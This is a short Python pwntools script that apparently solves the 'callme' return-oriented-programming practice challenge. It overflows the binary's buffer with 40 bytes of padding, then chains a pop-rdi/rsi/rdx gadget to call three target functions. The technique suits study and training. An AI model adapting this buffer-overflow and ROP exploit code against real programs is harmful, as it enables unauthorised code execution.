import pwn

# Setup enviroment
process = pwn.process("./callme")
pwn.context(os="linux", arch="amd64")
elf = pwn.ELF("callme")
rop = pwn.ROP(elf)

# Generate rop chain
pop_rdi_rsi_rdx = elf.symbols["usefulGadgets"]
rop.raw(pop_rdi_rsi_rdx)
rop.raw(1)
rop.raw(2)
rop.raw(3)
rop.call(elf.symbols["callme_one"])

rop.raw(pop_rdi_rsi_rdx)
rop.raw(1)
rop.raw(2)
rop.raw(3)
rop.call(elf.symbols["callme_two"])

rop.raw(pop_rdi_rsi_rdx)
rop.raw(1)
rop.raw(2)
rop.raw(3)
rop.call(elf.symbols["callme_three"])

payload = "A" * 40 + rop.chain()

process.readline()
process.readline()
process.readline()
process.readline()
print rop.dump()
process.sendline(payload)
print process.recvall()[2:]
